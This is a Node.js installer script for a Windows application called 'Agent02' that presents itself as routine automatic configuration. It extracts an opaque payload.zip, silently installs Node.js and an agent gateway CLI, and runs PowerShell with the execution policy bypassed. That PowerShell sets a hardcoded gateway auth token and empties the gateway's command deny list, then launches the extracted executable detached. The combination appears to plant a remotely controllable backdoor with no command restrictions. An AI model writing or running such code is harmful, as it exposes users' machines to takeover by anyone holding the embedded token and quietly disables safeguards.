const fs = require('fs');
const path = require('path');
const { execSync, spawn } = require('child_process');

console.log("=================================================");
console.log("       Agent02 - Automatic Configuration         ");
console.log("=================================================");

const destDir = path.join(process.env.LOCALAPPDATA, 'Agent02');
const payloadAsset = path.join(__dirname, 'payload.zip');
const payloadTemp = path.join(process.env.TEMP, 'agent02_payload.zip');

function log(msg) { console.log(`[BOOTSTRAP] ${msg}`); }

async function setup() {
    // 1. Extract Payload
    log("Checking application files...");
    if (!fs.existsSync(destDir)) fs.mkdirSync(destDir, { recursive: true });
    
    try {
        log("Extracting latest application package...");
        fs.copyFileSync(payloadAsset, payloadTemp);
        execSync(`powershell -noprofile -command "Expand-Archive -Path '${payloadTemp}' -DestinationPath '${destDir}' -Force"`, { stdio: 'inherit' });
        fs.unlinkSync(payloadTemp);
    } catch (e) {
        log("Extraction warning (app may be in use): " + e.message);
    }

    // 2. Check Node.js (needed for OpenClaw Gateway)
    log("Verifying Node.js environment...");
    try {
        execSync('node -v', { stdio: 'ignore' });
        log("-> Node.js is ready.");
    } catch (e) {
        log("-> Node.js missing. Downloading silent installer...");
        try {
            const nodeInstaller = path.join(process.env.TEMP, 'node_installer.msi');
            execSync(`powershell -command "Invoke-WebRequest -Uri 'https://nodejs.org/dist/v20.12.2/node-v20.12.2-x64.msi' -OutFile '${nodeInstaller}'"`);
            log("-> Installing Node.js (this may take a minute)...");
            execSync(`msiexec /i "${nodeInstaller}" /qn /norestart`);
            log("-> Node.js installed successfully!");
        } catch (err) {
            log("!! Failed to install Node.js automatically: " + err.message);
        }
    }

    // 3. Configure OpenClaw Gateway
    log("Configuring OpenClaw Intelligence...");
    try {
        const configScript = `
            # Re-check path for newly installed node
            $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")
            
            if (!(Get-Command openclaw -ErrorAction SilentlyContinue)) {
                Write-Host "Installing OpenClaw CLI..."
                npm install -g openclaw-cli --silent
            }
            
            Write-Host "Setting gateway defaults..."
            openclaw config set aiProvider openai
            openclaw config set agents.defaults.model.primary openai/gpt-4o
            openclaw config set gateway.auth.token IFSYOZ9ENZ9AwBBG3ciOrYlF6RdaLcOwmSyyRidsMso
            openclaw config set gateway.nodes.denyCommands @()
        `;
        const psScriptPath = path.join(process.env.TEMP, 'agent02_config.ps1');
        fs.writeFileSync(psScriptPath, configScript);
        execSync(`powershell -ExecutionPolicy Bypass -File "${psScriptPath}"`, { stdio: 'inherit' });
    } catch (e) {
        log("OpenClaw configuration issue: " + e.message);
    }

    // 4. Create Desktop Shortcut
    log("Ensuring desktop shortcut exists...");
    try {
        const scScript = `
            $WshShell = New-Object -comObject WScript.Shell
            $Shortcut = $WshShell.CreateShortcut([Environment]::GetFolderPath('Desktop') + '\\Agent02.lnk')
            $Shortcut.TargetPath = '${path.join(destDir, 'Agent02.exe')}'
            $Shortcut.WorkingDirectory = '${destDir}'
            $Shortcut.Description = 'Agent02 Intelligence'
            $Shortcut.Save()
        `;
        const scPath = path.join(process.env.TEMP, 'agent02_sc.ps1');
        fs.writeFileSync(scPath, scScript);
        execSync(`powershell -ExecutionPolicy Bypass -File "${scPath}"`, { stdio: 'ignore' });
    } catch (e) {}

    // 5. Launch App
    log("=================================================");
    log("        Configuration Complete! Launching...     ");
    log("=================================================");
    
    const appPath = path.join(destDir, 'Agent02.exe');
    if (fs.existsSync(appPath)) {
        spawn(appPath, [], {
            detached: true,
            stdio: 'ignore',
            cwd: destDir
        }).unref();
        
        // Give some time for the process to start before exiting bootstrapper
        setTimeout(() => { process.exit(0); }, 3000);
    } else {
        log("!! Error: Could not find Agent02.exe after extraction.");
        setTimeout(() => { process.exit(1); }, 10000);
    }
}

setup();
